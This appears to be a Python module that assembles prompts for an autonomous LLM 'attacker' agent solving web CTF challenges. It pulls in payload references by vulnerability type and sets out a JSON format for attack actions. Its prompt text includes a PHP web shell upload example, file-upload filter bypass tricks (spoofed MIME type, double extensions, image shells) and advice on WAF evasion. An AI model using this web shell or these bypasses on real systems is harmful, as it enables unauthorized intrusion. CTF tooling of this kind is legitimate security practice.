# -*- coding: utf-8 -*-
from typing import List, Dict
import json
from prompts.scene_framework import (
    get_scene_framework_for_attacker,
    get_encoding_tips,
    get_new_path_discovery_tips,
    get_tool_selection_principles,
    get_flag_location_strategy
)


def smart_truncate_output(output: str, max_length: int = 800) -> str:
    """
    智能截断输出，保留关键信息

    优先保留:
    1. 错误信息
    2. flag相关内容
    3. 前部和后部内容

    特殊处理:
    - 代码内容(<?php或<%): 扩大3倍
    - 路径/参数内容(path=或url=): 扩大2倍
    """
    if not output or len(output) <= max_length:
        return output

    output_lower = output.lower()

    # 根据内容类型调整长度
    if "<?php" in output_lower or "<%" in output_lower:
        max_length = max_length * 3
    elif "path=" in output_lower or "url=" in output_lower:
        max_length = max_length * 2

    if len(output) <= max_length:
        return output

    # 检查是否包含错误
    if "error" in output_lower or "fail" in output_lower:
        # 保留错误部分
        return "... " + output[-max_length+20:]

    # 检查是否包含flag
    if "flag" in output_lower:
        flag_pos = output_lower.find("flag")
        start = max(0, flag_pos - 50)
        end = min(len(output), flag_pos + max_length - 50)
        return "... " + output[start:end] + " ..."

    # 默认保留前部和后部
    half = max_length // 2
    return output[:half] + " ... " + output[-half:]


def get_relevant_payloads(vuln_candidates: List[Dict], limit: int = 5) -> str:
    """
    根据漏洞类型获取相关 Payload 参考

    Args:
        vuln_candidates: 漏洞候选列表
        limit: 每种漏洞类型的 Payload 数量限制

    Returns:
        格式化的 Payload 参考字符串
    """
    try:
        from payload_loader import payload_loader

        if not payload_loader.is_available():
            return ""

        payload_sections = []
        seen_types = set()

        for vuln in vuln_candidates[:5]:  # 最多处理5个候选
            vuln_type = vuln.get("type", "").lower()

            # 标准化漏洞类型
            type_mapping = {
                "sql": "sql_injection",
                "sqli": "sql_injection",
                "xss": "xss",
                "ssti": "ssti",
                "template": "ssti",
                "xxe": "xxe",
                "ssrf": "ssrf",
                "lfi": "lfi",
                "traversal": "path_traversal",
                "rce": "rce",
                "deserialization": "deserialization",
            }

            std_type = None
            for key, val in type_mapping.items():
                if key in vuln_type:
                    std_type = val
                    break

            if std_type and std_type not in seen_types:
                seen_types.add(std_type)
                payloads = payload_loader.load_payloads(std_type, limit=limit)
                if payloads:
                    payload_str = "\n".join([f"  - {p[:100]}" for p in payloads[:limit]])
                    payload_sections.append(f"**{vuln_type.upper()} Payload 参考**:\n{payload_str}")

        if payload_sections:
            return "\n\n".join(payload_sections)
        return ""

    except Exception as e:
        return ""


def get_attacker_prompt(vuln_candidates: List[Dict], tool_definitions: str,
                        attack_history: List[Dict] = None,
                        task_info: Dict = None,
                        tactical_guidance: str = None,
                        known_facts: str = None,
                        failed_payloads: List[str] = None,
                        include_payloads: bool = True,
                        stage_info: dict = None,
                        strategic_context: dict = None) -> str:
    """
    [简化版] 生成攻击兵提示词
    移除了analyst_intel参数，相关信息已合并到vuln_candidates的reason字段
    """
    # 历史攻击记录
    history_desc = "无"
    if attack_history:
        lines = []
        for h in attack_history[-5:]:
            tool = h.get("tool", "?")
            status = h.get("status", "?")
            output = smart_truncate_output(str(h.get("output", "")), max_length=300)
            lines.append(f"- {tool}: status={status}, output={output}")
        history_desc = "\n".join(lines)

    # 题目背景
    task_desc = ""
    if task_info:
        task_desc = f"题目: {task_info.get('name', 'Unknown')}\n目标: {task_info.get('current_url', 'N/A')}"

    # 已知事实
    facts_desc = ""
    if known_facts:
        facts_desc = f"\n已知事实: {known_facts}"

    # 战术指引
    guidance_desc = ""
    if tactical_guidance:
        guidance_desc = f"""
## 🎯 战术建议
{tactical_guidance}
"""

    # 失败payload列表 - 必须避免重复
    failed_desc = ""
    if failed_payloads:
        failed_items = "\n".join([f"- {p[:100]}" for p in failed_payloads[-20:]])
        failed_desc = f"""
## ⛔ 已失败的Payload（严禁重复）
以下payload已被证明无效，请勿再次尝试相同或极其相似的内容：
{failed_items}

**重要**：如果攻击方向正确但执行失败，应该：
1. 检查payload格式是否精确（语法完整性、编码正确性）
2. 分析是否存在过滤/拦截，尝试绕过技术
3. 换不同的函数/方法实现相同目标
4. 扩大或改变攻击范围（不同目录、不同参数、不同路径）
"""

    # 阶段信息注入
    stage_section = ""
    if stage_info:
        stage_section = f"""
## 当前阶段指引
- 阶段名称: {stage_info.get('stage_name', '')}
- 阶段目标: {stage_info.get('goal', '')}
- 成功标准: {stage_info.get('success_criteria', [])}
- 超时限制: {stage_info.get('timeout', 0)}秒
"""

    # 战略上下文注入
    strategic_section = ""
    if strategic_context:
        attack_chain = strategic_context.get('attack_chain', [])
        current_step = strategic_context.get('current_step', 1)
        total_steps = strategic_context.get('total_steps', len(attack_chain))
        current_stage_name = attack_chain[current_step-1] if current_step <= len(attack_chain) else '未知'
        blockers = strategic_context.get('blockers', [])
        alternate_routes = strategic_context.get('alternate_routes', [])
        strategic_section = f"""
## 战略上下文
- 当前位置: {strategic_context.get('position_type', 'web')}
- 攻击链进度: 第{current_step}步/共{total_steps}步
- 当前阶段: {current_stage_name}
- 主要目标: {strategic_context.get('primary_goal', '获取FLAG')}
- 已知障碍: {', '.join(blockers) if blockers else '无'}
- 备选路径: {', '.join(alternate_routes) if alternate_routes else '无'}
"""

    # 获取相关 Payload 参考
    payload_ref = ""
    if include_payloads and vuln_candidates:
        payload_ref = get_relevant_payloads(vuln_candidates)

    # 获取共享的提示模块
    scene_framework = get_scene_framework_for_attacker()
    encoding_tips = get_encoding_tips()
    path_discovery_tips = get_new_path_discovery_tips()
    tool_principles = get_tool_selection_principles()
    flag_location_strategy = get_flag_location_strategy()

    return f"""# CTF 攻击手

## 目标
获取 FLAG

## 任务
{task_desc}
{guidance_desc}

{stage_section}{strategic_section}
## 已知事实
{facts_desc}

## 攻击目标
{json.dumps(vuln_candidates, ensure_ascii=False, indent=2)}

注：关键情报已合并到漏洞候选的reason字段中。

## 历史攻击
{history_desc}
{failed_desc}

## 可用工具
{tool_definitions}

**注意**: 如需其他工具，在输出中添加 `query_tools` 字段列出工具名，系统将返回详情。

**端口扫描建议**: 外网打点时优先使用 fscan 进行端口扫描，它能发现开放端口、识别服务、检测弱口令和潜在漏洞。

{payload_ref}

{flag_location_strategy}

{encoding_tips}
{path_discovery_tips}

## 知识库检索决策

你可以在输出中添加 `need_rag` 和 `rag_query` 字段请求从知识库检索。

### 何时应该请求检索

1. 有明确漏洞指向（CVE编号、特定框架版本如thinkphp 5.0.23）
2. 需要具体利用脚本但不确定构造方式
3. 需要绕过特定防护（WAF、过滤）

### 何时不应该请求检索

- 信息充足，已有明确攻击思路
- 漏洞类型通用，可手工构造
- 已检索过相同内容

### 输出格式扩展

```json
{{
  "attack_actions": [...],
  "need_rag": true,
  "rag_query": "CVE-2025-24813 tomcat rce",
  "rag_source": "nuclei"
}}
```

rag_source 可选: payloads, nuclei, writeups, security_resources

## 输出要求
返回 JSON，包含 attack_actions 数组。

### 核心要求
- **tool**: 工具名称
- **params**: 完整参数

### 文件上传攻击格式

使用 `requests` 工具的 `files` 参数进行文件上传：

```json
{{"attack_actions": [
  {{"tool": "requests", "params": {{
    "method": "POST",
    "url": "http://target/upload.php",
    "files": {{"file": ["shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"]}}
  }}}}
]}}
```

files 参数格式: `{{"字段名": [文件名, 文件内容, MIME类型]}}`

常用绕过技巧：
- 修改 MIME 类型为 image/jpeg
- 使用双扩展名 shell.php.jpg
- 图片马：在真实图片内容后追加 PHP 代码

### 其他攻击格式

```json
{{"attack_actions": [
  {{"tool": "requests", "params": {{"method": "GET", "url": "http://target/?param=payload"}}}}
]}}
```

**关键**: payload 必须完整、语法正确。

{scene_framework}
{tool_principles}
"""